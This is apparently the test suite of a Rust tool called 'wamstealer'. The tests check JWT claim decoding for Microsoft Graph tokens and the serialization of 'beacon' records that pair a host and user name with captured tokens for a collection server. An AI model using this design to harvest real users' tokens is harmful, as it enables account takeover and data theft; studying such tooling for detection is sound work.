use wamstealer::beacon::{decode_claims, Beacon, Outcome};
use base64::Engine;
use serde_json::{json, Value};

fn base64url(value: &[u8]) -> String {
    base64::engine::general_purpose::URL_SAFE_NO_PAD.encode(value)
}

fn sample_token(claims: &serde_json::Value) -> String {
    format!(
        "{}.{}.{}",
        base64url(br#"{"alg":"HS256","typ":"JWT"}"#),
        base64url(claims.to_string().as_bytes()),
        base64url(b"signature")
    )
}

fn padded_token(claims: &serde_json::Value) -> String {
    let payload = base64::engine::general_purpose::URL_SAFE.encode(claims.to_string().as_bytes());
    format!("{}.{}.sig", base64url(br#"{"alg":"HS256"}"#), payload)
}

#[test]
fn claims_are_extracted_from_the_unverified_payload() {
    let claims = decode_claims(&sample_token(&json!({
        "aud": "https://graph.microsoft.com",
        "preferred_username": "user@example.com",
        "tid": "tenant-id",
        "scp": "Mail.ReadWrite Files.ReadWrite.All",
        "exp": 1893456000
    })))
    .expect("valid token");
    assert_eq!(claims.upn.as_deref(), Some("user@example.com"));
    assert_eq!(claims.tid.as_deref(), Some("tenant-id"));
    assert_eq!(claims.aud.as_deref(), Some("https://graph.microsoft.com"));
    assert_eq!(claims.scp.as_deref(), Some("Mail.ReadWrite Files.ReadWrite.All"));
    assert_eq!(claims.exp, Some(1893456000));
}

#[test]
fn claims_fall_back_to_upn_role_claim_and_audience_arrays() {
    let claims = decode_claims(&sample_token(&json!({
        "aud": ["first-audience", "second-audience"],
        "upn": "legacy@example.com",
        "roles": ["RoleA", "RoleB"]
    })))
    .expect("valid token");
    assert_eq!(claims.upn.as_deref(), Some("legacy@example.com"));
    assert_eq!(claims.aud.as_deref(), Some("first-audience"));
    assert_eq!(claims.scp.as_deref(), Some("RoleA RoleB"));
    assert_eq!(claims.tid, None);
    assert_eq!(claims.exp, None);
}

#[test]
fn padded_payloads_decode() {
    let claims = decode_claims(&padded_token(&json!({"preferred_username": "user@example.com"})));
    assert_eq!(claims.and_then(|c| c.upn).as_deref(), Some("user@example.com"));
}

#[test]
fn invalid_tokens_yield_no_claims() {
    for token in ["", "a", "a.b", "not-a-token", "x.@@@.y", "a.{}.c"] {
        assert!(decode_claims(token).is_none(), "{token}");
    }
    let claims = decode_claims(&sample_token(&json!({"exp": "soon"})));
    assert!(claims.is_some());
    assert_eq!(claims.unwrap().exp, None);
}

#[test]
fn outcomes_serialize_to_the_server_contract() {
    let token = sample_token(&json!({"preferred_username": "user@example.com", "tid": "t"}));
    let outcome = Outcome::ok(Some("user@example.com".into()), Some("acc".into()), token);
    let encoded = serde_json::to_value(&outcome).unwrap();
    assert_eq!(encoded["status"], "ok");
    assert_eq!(encoded["username"], "user@example.com");
    assert_eq!(encoded["account_id"], "acc");
    assert_eq!(encoded["claims"]["tid"], "t");

    let failure = Outcome::error(None, None, json!({"status": "runtime_error"}));
    let encoded = serde_json::to_value(&failure).unwrap();
    assert_eq!(encoded["status"], "error");
    assert_eq!(encoded["error"]["status"], "runtime_error");
    assert_eq!(
        serde_json::from_slice::<Value>(&serde_json::to_vec(&encoded).unwrap()).unwrap(),
        encoded
    );
}

#[test]
fn beacons_round_trip_through_the_server_contract() {
    let token = sample_token(&json!({"preferred_username": "user@example.com"}));
    let beacon = Beacon {
        agent: "wamstealer/1.1.0".into(),
        hostname: "HOSTNAME".into(),
        username: "alice".into(),
        client_id: "client".into(),
        scope: "https://graph.microsoft.com/.default".into(),
        authority: "common".into(),
        results: vec![Outcome::ok(None, None, token)],
    };
    let encoded = serde_json::to_vec(&beacon).unwrap();
    let decoded: Beacon = serde_json::from_slice(&encoded).unwrap();
    assert_eq!(decoded.hostname, "HOSTNAME");
    assert_eq!(decoded.results.len(), 1);
}
